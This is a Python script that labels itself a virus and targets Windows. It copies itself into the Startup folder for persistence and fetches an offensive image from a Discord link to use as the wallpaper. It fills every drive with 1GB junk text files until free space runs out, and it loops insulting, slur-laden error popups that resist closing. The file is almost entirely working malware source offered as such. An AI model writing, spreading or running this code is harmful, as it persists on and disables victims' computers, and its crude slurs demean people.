import winshell
import shutil
import os
import ctypes
import requests
import string
import psutil
import random
import sys
import webbrowser
import time
from tkinter import messagebox

# This should be very obvious but this is a virus and its very dangerous. Please do not run it on your computer unless you really want to be dumb. You have been warned

def copy_to_startup():
    # Get the path to the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the path of the current script
    script_path = sys.argv[0]

    # Copy the script to the startup folder
    shutil.copy(script_path, startup_folder)

def display_error_messages():
    while True:
        messagebox.showerror("LMAO", "Congratulations, you have won an STD!")
        messagebox.showerror("LMAO", "Aw come on, dont go.")
        messagebox.showerror("LMAO", "Give up.")
        messagebox.showerror("LMAO", "Where are you going?")
        messagebox.showerror("LMAO", "Nice try.")
        messagebox.showerror("LMAO", "I refuse to be closed.")

def display_image_box():
    while True:
        objExplorer = webbrowser.get("windows-default")
        objExplorer.open("about:blank")
        objExplorer.toolbar = 0
        objExplorer.statusbar = 0
        objExplorer.left = 200
        objExplorer.top = 200
        objExplorer.width = 200
        objExplorer.height = 250
        objExplorer.visible = True
        objExplorer.document.title = "get muazzed"
        objExplorer.document.body.innerHTML = "<img src='https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png' height=200 width=200>"

# Random Text Generator
def generate_random_text(size):
    # Generate random text of given size
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(size))

def create_system_files():
    # Get a list of available drives
    drives = psutil.disk_partitions()

    for drive in drives:
        drive_name = drive.device
        drive_free_space = psutil.disk_usage(drive_name).free

        # Check if drive has at least 1GB of free space
        if drive_free_space >= 1e9:
            folder_path = os.path.join(drive_name, "SystemFiles")

            # Create the folder if it doesn't exist
            if not os.path.exists(folder_path):
                os.mkdir(folder_path)

            # Fill the folder with 1GB text files until less than 1GB of free space is left
            while drive_free_space >= 1e9:
                file_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
                file_path = os.path.join(folder_path, file_name + ".txt")
                text = generate_random_text(int(1e9))  # Generate 1GB of random text

                # Write the text to the file
                with open(file_path, "w") as file:
                    file.write(text)

                # Update the free space on the drive
                drive_free_space = psutil.disk_usage(drive_name).free

            print(f"Filled {drive_name} with 1GB text files.")

# Changes wallpaper
def change_wallpaper():
    wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
    response = requests.get(wallpaper_url)
    image_data = response.content
    wallpaper_file = "wallpaper.png"
    with open(wallpaper_file, "wb") as file:
        file.write(image_data)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
    os.remove(wallpaper_file)

if __name__ == "__main__":
    copy_to_startup()
    change_wallpaper()
    time.sleep(2)
    copy_to_startup()
    create_system_files()
    while True:
        display_image_box()
        display_error_messages()
